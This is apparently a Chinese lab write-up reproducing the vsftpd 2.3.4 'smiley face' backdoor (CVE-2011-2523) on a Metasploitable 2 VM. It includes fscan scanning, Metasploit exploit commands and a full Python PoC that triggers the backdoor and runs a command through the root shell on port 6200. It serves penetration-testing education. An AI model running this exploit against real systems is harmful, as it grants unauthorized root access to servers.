---
title: vsftpd 2.3.4-笑脸漏洞
date: 2026-10-31 19:00:00
categories:
  - [技术, 安全]
tags: [安全, 渗透测试, 漏洞复现, vsftpd]
---

## 一、介绍：

**vsftpd 2.3.4 的某个被篡改的发行版源码里被植入了后门**。当你用包含  :)  的用户名去登录 FTP 时，服务端会悄悄在 **6200 端口**启动一个 **root 权限的 shell**。

## 二、测试：

以 Metasploitable 2 虚拟机作为靶机，它默认就带 vsftpd 2.3.4 笑脸漏洞，21 端口直接可用。

### 1. 信息收集

已知 靶机 和 kali 在同一网段下，需要获取 ip。

扫描工具我选择 fscan

```bash
./fscan_2.2.2_linux_x64 -h 192.168.220.0/24 -np
```

![fscan 扫出 21 端口是 vsFTPd 2.3.4](/img/posts/vsftpd-smiley/01-fscan.webp)

得到：

```
# ===== 服务信息 =====
......
192.168.220.140:21 ftp 220 (vsFTPd 2.3.4)
......

# ===== 漏洞信息 =====
192.168.220.140:21 ftp anonymous/anonymous
```

分析：21端口存在漏洞，接下来使用 msfconsole

### 2. 漏洞利用

```bash
msfconsole   # 打开控制台

search       # 搜索是否存在可利用exp
```

![msf 搜索 vsftpd 的结果](/img/posts/vsftpd-smiley/02-search.webp)

```bash
use exploit/unix/ftp/vsftpd_234_backdoor   #利用 exp
```

配置 exp ：

```bash
msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.220.140
rhost => 192.168.220.140
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[-] 192.168.220.140:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
msf exploit(unix/ftp/vsftpd_234_backdoor) > set lhost 192.168.220.141
lhost => 192.168.220.141
```

```bash
run     # 启动
```

![run 之后成功拿到 Meterpreter 会话](/img/posts/vsftpd-smiley/03-run.webp)

可以看到成功连上：

```bash
shell  # 打开终端

whoami # 验证权限
```

![shell 里 whoami 返回 root](/img/posts/vsftpd-smiley/04-shell.webp)

## 三、分析：

POC：smiley_detect.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2011-2523  vsftpd 2.3.4 笑脸后门  检测 PoC
Author: for CTF / lab use only

用法:
    python smiley_detect.py -t 192.168.220.140
    python smiley_detect.py -t 192.168.220.140 -p 21 --bd-port 6200
"""

import socket
import time
import argparse
import sys

# ---------- 颜色输出 ----------
class C:
    G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"; E = "\033[0m"

def ok(msg):   print(f"{C.G}[+]{C.E} {msg}")
def bad(msg):  print(f"{C.R}[-]{C.E} {msg}")
def info(msg): print(f"{C.B}[*]{C.E} {msg}")
def warn(msg): print(f"{C.Y}[!]{C.E} {msg}")

# ==================================================
# 阶段 1：连接 FTP，读取 Banner 指纹
# ==================================================
def grab_banner(host, port, timeout):
    info(f"阶段1: 连接 {host}:{port} 读取 FTP Banner ...")
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        banner = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        ok(f"Banner: {banner}")
        if "vsFTPd 2.3.4" in banner or "vsftpd 2.3.4" in banner.lower():
            ok("指纹命中: vsftpd 2.3.4 —— 高度可疑")
            return True, banner
        warn("Banner 不匹配 2.3.4，仍继续尝试触发（有些变体会伪造 Banner）")
        return False, banner
    except Exception as e:
        bad(f"无法连接 FTP: {e}")
        return None, None

# ==================================================
# 阶段 2：发送包含 :)\r\n 的 USER 命令触发后门
# ==================================================
def trigger(host, port, timeout):
    info("阶段2: 发送触发载荷  USER test:)\r\n ...")
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.recv(1024)                              # 收 banner
        s.sendall(b"USER test:)\r\n")             # ← 关键：用户名带 :)
        time.sleep(0.3)
        try:
            r1 = s.recv(1024).decode(errors="ignore").strip()
            if r1:
                print(f"    < {r1}")
        except socket.timeout:
            pass
        s.sendall(b"PASS whatever\r\n")
        time.sleep(0.3)
        try:
            r2 = s.recv(1024).decode(errors="ignore").strip()
            if r2:
                print(f"    < {r2}")
        except socket.timeout:
            warn("PASS 后无响应（后门触发时服务端可能直接断开，属正常现象）")
        s.close()
        ok("触发载荷已发送")
        return True
    except Exception as e:
        bad(f"触发阶段出错: {e}")
        return False

# ==================================================
# 阶段 3：探测 6200 后门端口
# ==================================================
def probe_backdoor(host, bd_port, timeout, retries=3):
    info(f"阶段3: 探测后门端口 {host}:{bd_port} ...")
    for i in range(retries):
        try:
            s = socket.create_connection((host, bd_port), timeout=timeout)
            ok(f"端口 {bd_port} 已开放 —— 后门存在！")
            return s
        except ConnectionRefusedError:
            warn(f"第 {i+1}/{retries} 次: 端口拒绝连接，重试 ...")
        except socket.timeout:
            warn(f"第 {i+1}/{retries} 次: 连接超时，重试 ...")
        except Exception as e:
            warn(f"第 {i+1}/{retries} 次: {e}")
        time.sleep(1.5)
    bad(f"端口 {bd_port} 未开放 —— 未检测到后门")
    return None

# ==================================================
# 阶段 4：通过后门执行命令验证
# ==================================================
def exec_cmd(sock, cmd="id", wait=1.5):
    info(f"阶段4: 在后门 shell 中执行 `{cmd}` ...")
    try:
        sock.settimeout(5)
        sock.sendall((cmd + "\n").encode())
        time.sleep(wait)
        out = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk
                if len(chunk) < 4096:
                    break
            except socket.timeout:
                break
        text = out.decode(errors="ignore").strip()
        if text:
            ok("命令回显:")
            for line in text.splitlines():
                print(f"    | {line}")
            if "uid=0" in text or "root" in text.lower():
                ok("确认: 后门以 root 权限返回 shell")
        else:
            warn("命令无回显（端口开放本身已足够判定漏洞存在）")
        return text
    except Exception as e:
        warn(f"命令执行异常: {e}")
        return ""

# ==================================================
# 主流程
# ==================================================
def main():
    ap = argparse.ArgumentParser(description="vsftpd 2.3.4 笑脸后门检测 (CVE-2011-2523)")
    ap.add_argument("-t", "--target", required=True, help="目标 IP / 域名")
    ap.add_argument("-p", "--port", type=int, default=21, help="FTP 端口，默认 21")
    ap.add_argument("--bd-port", type=int, default=6200, help="后门端口，默认 6200")
    ap.add_argument("--timeout", type=float, default=5.0, help="连接超时秒数")
    ap.add_argument("--no-exec", action="store_true", help="仅探测端口，不执行命令")
    args = ap.parse_args()

    print("=" * 60)
    print("  CVE-2011-2523  vsftpd 2.3.4  Smiley Backdoor Detector")
    print("=" * 60)
    print(f"  目标: {args.target}")
    print(f"  FTP : {args.port}    后门: {args.bd_port}")
    print("=" * 60)

    # 阶段1
    banner_ok, banner = grab_banner(args.target, args.port, args.timeout)
    if banner_ok is None:
        bad("目标不可达，退出")
        sys.exit(2)

    # 阶段2
    if not trigger(args.target, args.port, args.timeout):
        bad("触发失败，退出")
        sys.exit(2)

    # 阶段3
    bd_sock = probe_backdoor(args.target, args.bd_port, args.timeout)
    if bd_sock is None:
        print()
        bad(f"结论: {args.target} 未检测到笑脸后门")
        if not banner_ok:
            warn("Banner 也不是 2.3.4，可基本排除")
        else:
            warn("Banner 是 2.3.4 但后门未开，可能是防火墙拦截 6200 或已打补丁")
        sys.exit(1)

    # 阶段4
    if not args.no_exec:
        exec_cmd(bd_sock)
    bd_sock.close()

    print()
    ok(f"结论: {args.target} 存在 vsftpd 2.3.4 笑脸后门 (CVE-2011-2523)")
    sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(130)
```

```bash
python smiley_detect.py -t 192.168.220.140
```

![检测脚本跑完的输出：四个阶段全部命中](/img/posts/vsftpd-smiley/05-poc.webp)
